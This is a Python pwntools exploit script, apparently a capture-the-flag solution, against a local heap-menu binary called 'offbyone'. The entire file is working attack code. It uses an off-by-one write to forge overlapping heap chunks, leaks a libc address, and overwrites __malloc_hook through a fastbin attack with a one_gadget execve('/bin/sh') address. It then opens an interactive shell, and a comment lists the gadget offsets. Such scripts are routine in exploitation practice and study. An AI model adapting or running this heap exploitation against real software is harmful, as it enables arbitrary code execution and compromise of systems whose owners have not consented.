from pwn import *

p = process('./offbyone')
context.log_level = 'debug'

def launch_gdb():
    context.terminal = ['xfce4-terminal', '-x', 'sh', '-c'] 
    gdb.attach(proc.pidof(p)[0]) 

def new(s,c):
    p.recvuntil('>')
    p.sendline('1')
    p.recvuntil('size')
    p.sendline(str(s))
    p.recvuntil('data')
    p.send(c)
    

def delete(i):
    p.recvuntil('>')
    p.sendline('2')
    p.recvuntil('index')
    p.sendline(str(i))
    

def show(i):
    p.recvuntil('>')
    p.sendline('3')
    p.recvuntil('index?')
    p.sendline(str(i))

def edit(i,s):
    p.recvuntil('>')
    p.sendline('4')
    p.recvuntil('index?')
    p.sendline(str(i))
    p.recvuntil('data')
    p.send(s)
# launch_gdb()
new(0x28,'zzz') # 0
new(0xf0,'aaa') # 1
new(0x60,'/bin/sh\x00') # 2
new(0x60,'/bin/sh\x00') # 3
edit(0,p64(0) * 5 + p8(0x71))
delete(1)
new(0xf0,'a') # 1
show(1)
leak = p.recv(6).ljust(8,'\x00')
leak = u64(leak)
log.info('leak ' + hex(leak))
libc_base = leak - 3951713
malloc_hook = 3951376 + libc_base
sys_addr = 0xf0364 + libc_base
realloc_addr = 542480 + libc_base
new(0x60,'/bin/sh\x00') # 4
delete(4)
delete(3)
delete(2)
'''
0x45226	execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4527a	execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf0364	execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1207	execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
new(0x60,p64(malloc_hook - 0x23))
new(0x60,p64(malloc_hook - 0x23))
new(0x60,p8(0) * 0xb + p64(sys_addr) + p64(realloc_addr))
# new(0x60,p8(0) * 0xb + p64(sys_addr) + p64(realloc_addr))
new(0x60,p8(0) * 0x13 + p64(sys_addr))
delete(2)
delete(4)
# p.recvuntil('>')
# p.sendline('1')
# p.recvuntil('size')
# p.sendline('0')
p.interactive()